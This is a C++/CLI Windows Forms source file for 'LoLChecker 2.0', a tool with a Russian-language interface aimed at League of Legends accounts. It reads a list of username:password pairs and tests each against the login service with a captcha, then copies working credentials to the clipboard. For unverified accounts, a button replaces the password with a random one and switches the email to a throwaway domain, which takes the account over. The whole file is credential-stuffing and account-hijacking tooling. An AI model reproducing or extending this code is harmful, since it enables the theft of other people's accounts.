#pragma once
#include "captcha.h"
#include "FileReader.h"
#include <msclr\marshal_cppstd.h>
namespace Ivanich {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Сводка для MyForm
	/// </summary>
	public ref class MyForm : public System::Windows::Forms::Form
	{
	public:
		MyForm(void)
		{
			InitializeComponent();
			//
			//TODO: добавьте код конструктора
			//
		}

	protected:
		/// <summary>
		/// Освободить все используемые ресурсы.
		/// </summary>
		~MyForm()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Button^  button1;
	protected: 
	private: System::Windows::Forms::TextBox^  textBox1;
	private: System::Windows::Forms::Label^  label1;
	private: System::Windows::Forms::PictureBox^  pictureBox1;
	private: Captcha* captcha;
	private: CFileReader* fileReader;
	private: System::Windows::Forms::Button^  button2;
	private: System::Windows::Forms::OpenFileDialog^  openFileDialog1;
	private: System::Windows::Forms::Button^  button3;
	private: System::Windows::Forms::Label^  label2;
	private: System::Windows::Forms::Button^  button4;
	private: System::Windows::Forms::Button^  button5;


	private:
		/// <summary>
		/// Требуется переменная конструктора.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Обязательный метод для поддержки конструктора - не изменяйте
		/// содержимое данного метода при помощи редактора кода.
		/// </summary>
		void InitializeComponent(void)
		{
			this->button1 = (gcnew System::Windows::Forms::Button());
			this->textBox1 = (gcnew System::Windows::Forms::TextBox());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
			this->button2 = (gcnew System::Windows::Forms::Button());
			this->openFileDialog1 = (gcnew System::Windows::Forms::OpenFileDialog());
			this->button3 = (gcnew System::Windows::Forms::Button());
			this->label2 = (gcnew System::Windows::Forms::Label());
			this->button4 = (gcnew System::Windows::Forms::Button());
			this->button5 = (gcnew System::Windows::Forms::Button());
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^  >(this->pictureBox1))->BeginInit();
			this->SuspendLayout();
			// 
			// button1
			// 
			this->button1->Location = System::Drawing::Point(119, 121);
			this->button1->Name = L"button1";
			this->button1->Size = System::Drawing::Size(75, 23);
			this->button1->TabIndex = 0;
			this->button1->Text = L"Проверить";
			this->button1->UseVisualStyleBackColor = true;
			this->button1->Click += gcnew System::EventHandler(this, &MyForm::button1_Click);
			// 
			// textBox1
			// 
			this->textBox1->Location = System::Drawing::Point(119, 92);
			this->textBox1->Name = L"textBox1";
			this->textBox1->Size = System::Drawing::Size(204, 20);
			this->textBox1->TabIndex = 1;
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Location = System::Drawing::Point(116, 212);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(35, 13);
			this->label1->TabIndex = 2;
			this->label1->Text = L"label1";
			// 
			// pictureBox1
			// 
			this->pictureBox1->Location = System::Drawing::Point(12, 12);
			this->pictureBox1->Name = L"pictureBox1";
			this->pictureBox1->Size = System::Drawing::Size(311, 74);
			this->pictureBox1->SizeMode = System::Windows::Forms::PictureBoxSizeMode::CenterImage;
			this->pictureBox1->TabIndex = 3;
			this->pictureBox1->TabStop = false;
			this->pictureBox1->DoubleClick += gcnew System::EventHandler(this, &MyForm::pictureBox1_DoubleClick);
			// 
			// button2
			// 
			this->button2->Location = System::Drawing::Point(200, 121);
			this->button2->Name = L"button2";
			this->button2->Size = System::Drawing::Size(123, 23);
			this->button2->TabIndex = 4;
			this->button2->Text = L"Следующий аккаунт";
			this->button2->UseVisualStyleBackColor = true;
			this->button2->Click += gcnew System::EventHandler(this, &MyForm::button2_Click);
			// 
			// openFileDialog1
			// 
			this->openFileDialog1->FileName = L"openFileDialog1";
			this->openFileDialog1->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &MyForm::openFileDialog1_FileOk);
			// 
			// button3
			// 
			this->button3->Location = System::Drawing::Point(13, 92);
			this->button3->Name = L"button3";
			this->button3->Size = System::Drawing::Size(75, 23);
			this->button3->TabIndex = 5;
			this->button3->Text = L"Файл...";
			this->button3->UseVisualStyleBackColor = true;
			this->button3->Click += gcnew System::EventHandler(this, &MyForm::button3_Click);
			// 
			// label2
			// 
			this->label2->AutoSize = true;
			this->label2->Location = System::Drawing::Point(10, 212);
			this->label2->Name = L"label2";
			this->label2->Size = System::Drawing::Size(0, 13);
			this->label2->TabIndex = 6;
			// 
			// button4
			// 
			this->button4->Location = System::Drawing::Point(119, 148);
			this->button4->Name = L"button4";
			this->button4->Size = System::Drawing::Size(204, 23);
			this->button4->TabIndex = 7;
			this->button4->Text = L"Изменить данные аккаунта";
			this->button4->UseVisualStyleBackColor = true;
			this->button4->Click += gcnew System::EventHandler(this, &MyForm::button4_Click);
			// 
			// button5
			// 
			this->button5->Location = System::Drawing::Point(119, 177);
			this->button5->Name = L"button5";
			this->button5->Size = System::Drawing::Size(204, 23);
			this->button5->TabIndex = 8;
			this->button5->Text = L"Посмотреть профиль на LOLKING";
			this->button5->UseVisualStyleBackColor = true;
			this->button5->Click += gcnew System::EventHandler(this, &MyForm::button5_Click);
			// 
			// MyForm
			// 
			this->AcceptButton = this->button1;
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(342, 273);
			this->Controls->Add(this->button5);
			this->Controls->Add(this->button4);
			this->Controls->Add(this->label2);
			this->Controls->Add(this->button3);
			this->Controls->Add(this->button2);
			this->Controls->Add(this->pictureBox1);
			this->Controls->Add(this->label1);
			this->Controls->Add(this->textBox1);
			this->Controls->Add(this->button1);
			this->Name = L"MyForm";
			this->Text = L"LoLChecker 2.0";
			this->Load += gcnew System::EventHandler(this, &MyForm::MyForm_Load);
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^  >(this->pictureBox1))->EndInit();
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion
	private: System::Void MyForm_Load(System::Object^  sender, System::EventArgs^  e) {
				captcha = new Captcha();
				std::string getCaptcha = captcha->GetCaptcha();
				String^ CaptchaString = gcnew String(getCaptcha.c_str());
				this->pictureBox1->Load(CaptchaString);
			 }
	private: System::Void button1_Click(System::Object^  sender, System::EventArgs^  e) {
				 if(fileReader)
				 {
					 msclr::interop::marshal_context context;
					 captcha->SetCaptcha(context.marshal_as<std::string>(this->textBox1->Text));

					 if(fileReader->is_exists())
					 {
						 Captcha::LoginResponse Response = captcha->CheckLogin(fileReader->getCurrent());
						 this->captcha->GetData();

						 String^ NameString = gcnew String(captcha->GoodAcc.strUsername.c_str());
						 String^ PasswordString = gcnew String(captcha->GoodAcc.strPassword.c_str());

						 if(Response.strSuccess != "false")
						 {
							 this->label1->Text = "Аккаунт рабочий. Уровень: " + this->captcha->GoodAcc.iLvl + "\nАккаунт: " + NameString + ":" + PasswordString;

							 Clipboard::SetDataObject(NameString + ":" + PasswordString, true);
						 }
						 else
						 {
							 this->label1->Text = "Аккаунт не работает.";
						 }

						 std::string getCaptcha = captcha->GetCaptcha();
						 String^ CaptchaString = gcnew String(getCaptcha.c_str());
						 this->pictureBox1->Load(CaptchaString);

						 this->textBox1->Focus();

						 String^ VerifyString = gcnew String(this->captcha->GoodAcc.strUnverified.c_str());

						 this->label2->Text = (VerifyString == "true") ? "(Неподтвержден)" : "(Подтвержден)";
						 this->label2->ForeColor = (VerifyString == "true") ? Color::Green : Color::Red;
					 }
					 else
					 {
						 this->label1->Text = "Загрузите список аккаунтов.";
					 }
				 }
				 else
				 {
					 this->label1->Text = "Загрузите файл!";
				 }
			 }
	private: System::Void pictureBox1_DoubleClick(System::Object^  sender, System::EventArgs^  e) {
				std::string getCaptcha = captcha->GetCaptcha();
				String^ CaptchaString = gcnew String(getCaptcha.c_str());
				this->pictureBox1->Load(CaptchaString);
			 }
private: System::Void button2_Click(System::Object^  sender, System::EventArgs^  e) {
			 if(fileReader)
			 {
				 UserData nextLine = fileReader->getNext();

				 std::string string = "Проверяем -> " + nextLine.username + ":" + nextLine.password;

				 String^ ButtonString = gcnew String(string.c_str());

				 this->label1->Text = ButtonString;
				 this->textBox1->Focus();
			 }
			 else
			 {
				 this->label1->Text = "Загрузите файл!";
			 }
		 }
private: System::Void openFileDialog1_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {

		 }
private: System::Void button3_Click(System::Object^  sender, System::EventArgs^  e) {
			 if(this->openFileDialog1->ShowDialog() == System::Windows::Forms::DialogResult::OK)
			 {
				 if(fileReader)
				 {
					 delete fileReader;
				 }

				 msclr::interop::marshal_context context;
				 std::string stdString = context.marshal_as<std::string>(this->openFileDialog1->FileName);
				 fileReader = new CFileReader((std::string) stdString);
			 }
		 }
private: System::Void button4_Click(System::Object^  sender, System::EventArgs^  e) {
			 if(captcha->GoodAcc.strUnverified == "true")
			 {
				 std::string newPassword = fileReader->getRandom(10, true);
				 Captcha::ChangeDataStruct data = captcha->ChangeData(newPassword, captcha->GoodAcc.strUsername + fileReader->getRandom(4, false) + "@shittywizzard.me");
				 this->label1->Text = (String^) gcnew String(data.message.c_str());
				 if(data.success)
				 {
					String^ newStr = gcnew String((captcha->GoodAcc.strUsername + ":" + newPassword + "\nЭлектронная почта:" + data.newMail).c_str());
					this->label1->Text = "Данные аккаунта изменены." + "\n" + newStr;
					Clipboard::SetDataObject(newStr, true);
					captcha->GoodAcc.strPassword = newPassword;
				 }
			 }
			 else
			 {
				 this->label1->Text = "Невозможно сменить данные.";
			 }
		 }
private: System::Void button5_Click(System::Object^  sender, System::EventArgs^  e) {
			 if(!this->captcha->GoodAcc.id.empty())
			 {
				System::Diagnostics::Process::Start("http://lolking.net/summoner/euw/" + (String^) gcnew String(this->captcha->GoodAcc.id.c_str()));
			 }
		 }
};
}
